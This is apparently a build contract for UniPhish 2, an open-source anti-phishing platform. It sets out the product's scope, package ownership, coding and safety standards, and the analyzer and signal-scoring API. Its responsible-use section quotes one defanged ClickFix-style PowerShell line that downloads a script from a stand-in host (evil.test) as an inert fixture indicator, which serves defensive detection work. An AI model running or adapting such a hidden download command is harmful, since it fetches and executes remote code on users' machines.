# UniPhish 2 — Build Contract (read fully before writing code)

This file is the shared contract for everyone building UniPhish 2. It defines the
product, the package layout, file ownership, coding rules and the analyzer API.

## 1. The product

**UniPhish 2 is an open-source, AI-native anti-phishing platform.** One explainable
detection engine analyses every phishing delivery vector — URLs, HTML pages, emails,
attachments/images (QR "quishing"), and free text (SMS/chat "smishing", LLM context) —
and protects both **humans** (browser extension, Telegram bot, SOC console) **and AI
agents** (AgentGuard MCP server: stops agents from being phished or prompt-injected).

It targets the phishing of 2025-2026, not 2015:
* Unicode homoglyph / IDN homograph domains across scripts (the original UniPhish
  byte-level CNN core, now TF-free) — Latin, Cyrillic, Greek, Arabic, CJK, Devanagari,
  Hangul …
* Adversary-in-the-Middle MFA-bypass kits (Evilginx / EvilProxy / Tycoon 2FA style),
  ClickFix / fake-CAPTCHA "paste this into Run" attacks, Browser-in-the-Browser,
  HTML smuggling, SVG phishing attachments, QR-code phishing, OAuth consent and
  device-code phishing, callback (TOAD) phishing, BEC, crypto drainers,
  "living-off-trusted-sites" hosting (Cloudflare Pages/Workers, Firebase, IPFS, …).
* Prompt injection hidden in web pages / emails that targets AI agents.

Outputs are SOC-grade: explainable verdicts (every point of risk is attributable to a
signal), MITRE ATT&CK + ATLAS mapping, IOC extraction and detection-as-code exports
(STIX 2.1/TAXII, MISP, Sigma, Suricata, YARA, Elastic ECS).

## 2. Package layout and ownership

You may only create/modify files you own (listed in your task). **Never edit files
owned by someone else**, especially the shared spine below. If you need a change in a
file you don't own (a dependency, a registry entry, a core type field), describe it in
your final `integrator_requests` output instead.

Shared spine (owned by the integrator — read, don't edit):

```
pyproject.toml                    deps, extras, ruff/pytest config
uniphish/__init__.py              public convenience API (scan_url, scan_email, …)
uniphish/core/types.py            Artifact, Signal, Indicator, BrandMatch, Verdict, enums
uniphish/core/analyzer.py         Analyzer base, AnalyzerResult, AnalysisOptions/Context, @register
uniphish/core/engine.py           Engine (staged concurrent analyzers, children, fusion)
uniphish/core/scoring.py          log-odds fusion, thresholds, summary
uniphish/core/config.py           Settings (env UNIPHISH_*)
uniphish/core/mitre.py            ATT&CK + ATLAS technique catalog
uniphish/core/events.py           in-process pub/sub (SSE live stream)
uniphish/analyzers/__init__.py    BUILTIN_MODULES list (tolerant import)
uniphish/assets/__init__.py       load_yaml / load_json / load_lines / asset_path
tests/conftest.py                 network is BLOCKED in tests; per-test data dir
```

Target layout (each area owned by one builder):

```
uniphish/url/        parse.py, model.py, saliency.py, confusables.py, scripts.py,
                     idn_policy.py, brands.py, brandkb.py, lexical.py, techniques.py
uniphish/page/       html.py, favicon.py, rules.py (signature engine)
uniphish/mail/       parse.py, auth.py, heuristics.py      (package is 'mail', not 'email')
uniphish/files/      static.py, qr.py
uniphish/nlp/        social_engineering.py (multilingual lure / urgency lexicons)
uniphish/intel/      dns.py, rdap.py, tls.py, asn.py, fetch.py, detonate.py, feeds.py,
                     connectors.py
uniphish/agent/      injection.py, guard.py, mcp_server.py
uniphish/hunt/       ct.py, permutations.py, brandwatch.py
uniphish/export/     stix.py, misp.py, sigma.py, suricata.py, yara.py, ecs.py, report.py
uniphish/ai/         analyst.py, prompts.py
uniphish/store/      db.py
uniphish/server/     FastAPI app (app.py, routes/, security.py, static/ = built dashboard)
uniphish/cli/        main.py (Typer app `uniphish`)
uniphish/integrations/ mailbox.py (IMAP abuse inbox), sinks.py (webhook/Slack/Splunk/Elastic)
uniphish/eval/       benchmark + red-team harness
uniphish/ml/         TensorFlow training stack (optional extra; never imported at runtime)
uniphish/analyzers/  url.py ml.py page.py kits.py injection.py text.py email.py file.py
                     reputation.py infra.py fetch.py
uniphish/assets/     brands.yaml, tlds.yaml, lots.yaml, lures.yaml, … model/, unicode/, rules/
web/                 React + TypeScript SOC console (built into uniphish/server/static/)
extension/           Manifest V3 browser extension (on-device)
bot/                 Telegram bot
examples/corpus/     labelled, defanged sample corpus (emails, pages, urls, texts)
tests/<area>/        tests for each area (pytest, --import-mode=importlib, no __init__.py)
```

Legacy top-level modules (`uniphish/brands.py`, `reasons.py`, `enrich.py`,
`classify_attack.py`, `threatintel.py`, `ioc_store.py`, `infer.py`, `explain.py`, …,
`api/server.py`, `scripts/*.py`) are being superseded. Read them for ideas and reuse
their good parts, but build the new modules in the new layout. Don't delete legacy
files unless your task says so.

## 3. Environment

* Repo root: the current working directory. Python: **`.venv/bin/python`** (3.12).
  All runtime deps are pre-installed (numpy, pydantic 2, httpx, dnspython, idna,
  tldextract, pyyaml, bs4, lxml, defusedxml, cryptography, mmh3, typer, rich, jinja2,
  fastapi, uvicorn, mcp, anthropic, opencv-python-headless, pillow, playwright,
  yara-python, oletools, pyzipper, stix2, websockets, python-telegram-bot, pytest,
  pytest-asyncio, hypothesis, respx, ruff). TensorFlow is NOT installed.
* If you truly need another package: `uv pip install --python .venv/bin/python <pkg>`
  and list it in `integrator_requests`.
* Node 26 + npm are available for `web/` and `extension/` work.
* Run tests: `.venv/bin/python -m pytest tests/<your-area> -q`.
  Lint: `.venv/bin/ruff check <your files>`.
* **Git: read-only.** Never run `git commit/checkout/stash/reset/restore/clean/rebase`
  or anything that changes the working tree or index — other builders are working in
  the same checkout concurrently.
* Other builders edit other files concurrently. Use the Edit tool for existing files;
  if an edit fails because the file changed, re-read and retry. Never bulk-overwrite a
  file you don't own.

## 4. Coding standards

* Python ≥ 3.10, `from __future__ import annotations`, full type hints, module
  docstring explaining *why* the module exists, docstrings on public functions.
* No `print` in library code — use `logging.getLogger("uniphish.<area>")`.
* Deterministic, pure functions where possible. Precompile regexes at import time.
  **Every regex applied to attacker-controlled input must be ReDoS-safe** (no nested
  quantifiers on overlapping classes; bound input length before matching).
* Offline-first: no network unless `ctx.online` is true, and then **only through
  `uniphish.core.net`** (SSRF-safe). Never fetch with raw `requests`/`urllib`.
* Treat every analysed input as hostile: bound sizes, never execute/evaluate content,
  parse XML/SVG with `defusedxml`, cap archive extraction (zip-bomb safe), never
  follow file paths from inputs.
* Data (brand lists, TLD risk, keyword lexicons, rules) lives in `uniphish/assets/`
  as YAML/JSON, not hard-coded in Python. Load via `uniphish.assets.load_yaml(...)`.
* Keep modules cohesive (< ~600 lines); split when larger.
* Tests: thorough, fast (< 2 s per file typical), offline. Network is blocked by
  `tests/conftest.py`; mock `uniphish.core.net` / use `httpx.MockTransport` / `respx`.
  Put fixtures under `tests/<area>/fixtures/`. Use Hypothesis where it adds value
  (parsers, normalisers).
* Responsible use: this is a **defensive** tool. Sample phishing content must be
  synthetic and inert: use reserved/fake domains (`.test`, `.example`, `.invalid`,
  `example.com`) or obviously fake lookalikes; never include working malware, real
  exfiltration endpoints, real credentials, or real victims' data. ClickFix/AiTM
  fixtures should contain *indicators* (patterns), not functional payloads (e.g. a
  PowerShell string that is clearly inert like `powershell -w hidden -c "iwr hxxp://evil.test/a.ps1"`).

## 5. Writing an analyzer

```python
from uniphish.core.analyzer import Analyzer, AnalyzerResult, AnalysisContext, register
from uniphish.core.types import Artifact, ArtifactKind, Signal, Indicator, IndicatorType

@register
class PageAnalyzer(Analyzer):
    name = "page"                                  # unique, short
    kinds = frozenset({ArtifactKind.PAGE})
    stage = 0                                      # 0 static, 10 uses earlier results,
                                                   # 20 network enrichment, 30 active fetch
    requires_online = False
    blocking = True                                # CPU-bound -> implement analyze_sync
    description = "HTML structure: credential forms, brand/title mismatch, obfuscation"
    signals = {"page.form.password_cross_origin": "Password form posts to another site"}

    def analyze_sync(self, artifact: Artifact, ctx: AnalysisContext) -> AnalyzerResult:
        ...
```

* Return `AnalyzerResult(signals=[...], indicators=[...], children=[...], brand=...,
  techniques=[...], meta={...})`. Children are new `Artifact`s (e.g.
  `Artifact.from_url(link, origin="email.link", anchor_text=...)`); the engine
  analyses them recursively (bounded) and propagates their risk to the parent.
* Read earlier-stage results with `ctx.results["url"]`, the best brand with
  `ctx.brand()`, and share expensive parses with `ctx.memo("mail.parsed", fn)`.
* **Declare every signal id in the `signals` class dict** (id -> title). The docs and
  dashboard generate the detection catalog from it.

### Signal conventions

* `id`: lowercase dotted, namespaced by area: `url.*`, `unicode.*`, `brand.*`, `ml.*`,
  `page.*`, `kit.*`, `email.*`, `auth.*`, `social.*`, `file.*`, `qr.*`, `infra.*`,
  `rep.*`, `agent.*`, `fetch.*`.
* `title`: ≤ 70 chars, reads well after "Flagged because: …" (e.g. "Domain imitates
  PayPal using Cyrillic look-alike letters").
* `detail`: one or two sentences with the concrete specifics (which characters, which
  host, which header) — written for a non-expert user and a SOC analyst alike.
* `category`: one evidence family (url, unicode, brand, ml, page, kit, email, auth,
  social, file, infra, reputation, agent, fetch). Signals in the same category are
  **damped** (correlated evidence); different categories add up.
* `weight`: signed log-odds. Prior is −2.0 (≈12%); suspicious ≥ 0.50 risk (logit 0);
  malicious ≥ 0.85 (logit ≈ +1.73). Scale:
  * +6…+8 decisive (live-feed IOC hit, AiTM kit fingerprint, ClickFix payload)
  * +3…+5 strong (brand homoglyph, credential form to foreign host on lookalike)
  * +1…+2 moderate (abused TLD, new domain, urgency language, shortener)
  * +0.2…+1 weak/contextual
  * −1…−4 legitimacy (official brand domain, top-ranked site, aligned DMARC pass)
* Add `mitre=[...]` ATT&CK/ATLAS ids from `uniphish/core/mitre.py` CATALOG where it
  genuinely applies, `evidence={...}` with machine-readable specifics, and `span=(s, e)`
  for character ranges in a URL/text when you can (the UI highlights them).
* Benign-looking but legitimately hosted content must not explode: an exact official
  brand domain or a top-ranked site should produce negative evidence — but phishing on
  "living-off-trusted-sites" hosts (sites.google.com, *.pages.dev, *.web.app, ipfs
  gateways, …) must NOT get the reputation bonus.

## 6. Final output

End your work by returning the structured result requested (summary, files, public
API with signatures, exact test commands + results, integrator requests, known
issues). Be precise and honest: say what does not work.
